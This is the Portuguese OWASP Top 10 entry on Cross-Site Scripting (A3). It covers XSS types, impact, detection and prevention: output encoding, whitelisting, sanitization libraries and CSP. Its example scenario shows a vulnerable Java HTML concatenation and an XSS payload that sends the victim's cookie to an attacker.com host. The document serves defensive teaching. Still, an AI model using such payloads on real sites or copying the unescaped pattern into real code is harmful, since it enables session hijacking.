A3
Cross-Site Scripting (XSS)
Agentes de Ameaça
Específico da Aplicação
Exploração
MÉDIA
Prevalência
MUITO DIFUNDIDA
Detecção
FÁCIL
Impacto
MODERADO
Específico do Negócio / Aplicação
Considere alguém que possa enviar dados não-confiáveis para o sistema, incluindo usuários externos, usuários internos, e administradores.
Os atacantes enviam ataques de script baseado em texto que exploram o interpretador no navegador. Quase qualquer fonte de dados pode ser um vetor de ataque, incluindo fontes internas como dados do banco de dados.
XSS é a mais predominante falha de segurança em aplicações web. As falhas de XSS ocorrem quando uma aplicação inclui os dados fornecidos pelo usuário na página, enviados ao navegador, sem a validação ou filtro apropriados desse conteúdo. Existem três tipos conhecidos de falhas XSS: 1) Persistente, 2) Refletido, e 3) XSS baseado em DOM.
A detecção da maioria das falhas XSS é bastante fácil via testes ou análise de código.
Atacantes podem executar scripts no navegador da vítima para sequestrar sessões do usuário, desfigurar web sites, inserir conteúdo hostil, redirecionar usuários, seqüestrar o navegador usando malware, etc.
Impactos no Negócio
Considere o valor do negócio do sistema afetado e todos os dados que processa.
Também considere o impacto no negócio da exposição pública da vulnerabilidade.
Exemplo de Cenário de Ataque A aplicação utiliza dados não-confiáveis na construção do seguinte fragmento HTML sem validação ou filtro: (String) page += "<input name='creditcard' type='TEXT‘ value='" + request.getParameter("CC") + "'>"; O atacante modifica o parâmetro 'CC' em seu navegador para: '><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'. Isso causa o envio do ID de sessão da vítima para o site do atacante, permitindo que o atacante sequestre a sessão atual do usuário. Note que o atacante também pode usar o XSS para anular qualquer defesa automática de CSRF que a aplicação possa empregar. Veja o A8 para informações sobre CSRF.
Estou vulnerável?
Você está vulnerável se não garantir que todas as entradas fornecidas pelos usuários sejam apropriadamente filtradas, ou você não verifica que elas sejam seguras via validação de entrada, antes de incluir essa entrada na página de saída. Sem o adequado filtro ou validação da saída, tal entrada será tratada como conteúdo ativo no navegador. Se o Ajax está sendo usado para atualizar a página dinamicamente, você está usando APIS seguras do JavaScript? Para APIS inseguras, codificação ou validação também devem ser usadas.
Ferramentas automatizadas podem encontrar alguns problemas de XSS automaticamente. Porém, cada aplicação constrói páginas de saída diferentemente e utiliza diferentes interpretadores no lado do navegador como JavaScript, ActiveX, Flash, e Silverlight, criando dificuldades para a detecção automática. Portanto, uma cobertura completa exige uma combinação de revisão manual de código e teste de invasão, além das abordagens automatizadas.
Tecnologias Web 2.0, como Ajax, tornam o XSS muito mais difícil de detectar via ferramentas automatizadas.
Referências OWASP
• OWASP XSS Prevention Cheat Sheet
• OWASP DOM based XSS Prevention Cheat Sheet
• OWASP Cross-Site Scripting Article
• ESAPI Encoder API
• ASVS: Output Encoding/Escaping Requirements (V6)
• OWASP AntiSamy: Sanitization Library
• Testing Guide: 1st 3 Chapters on Data Validation Testing
• OWASP Code Review Guide: Chapter on XSS Review
• OWASP XSS Filter Evasion Cheat Sheet Externas
• CWE Entry 79 on Cross-Site Scripting
Como faço para evitar? Evitar XSS requer a separação do dado não-confiável do conteúdo ativo no navegador.
1.A opção apropriada é filtrar adequadamente todos os dados não-confiáveis com base no contexto HTML (corpo, atributo, JavaScript, CSS ou URL) no qual os dados serão colocados. Veja o OWASP XSS Prevention Cheat Sheet para detalhes sobre os requisitos das técnicas de filtro de dados.
2.“Lista branca" ou validação de entrada positiva também é recomendada pois ajuda a proteger contra XSS, mas não é uma defesa completa, já que muitas aplicações requerem caracteres especiais em sua entrada. Tal validação deve, tanto quanto possível, validar o tamanho, caracteres, formato, e as regras de negócio sobre os dados antes de aceitar a entrada.
3.Para conteúdo rico considere bibliotecas de auto-sanitização como OWASP's AntiSamy ou o Java HTML Sanitizer Project.
4.Considere a Content Security Policy (CSP) para se defender contra XSS em todo o seu site.
Vulnerabilidades de Segurança
Vetores de Ataque
Impactos Técnicos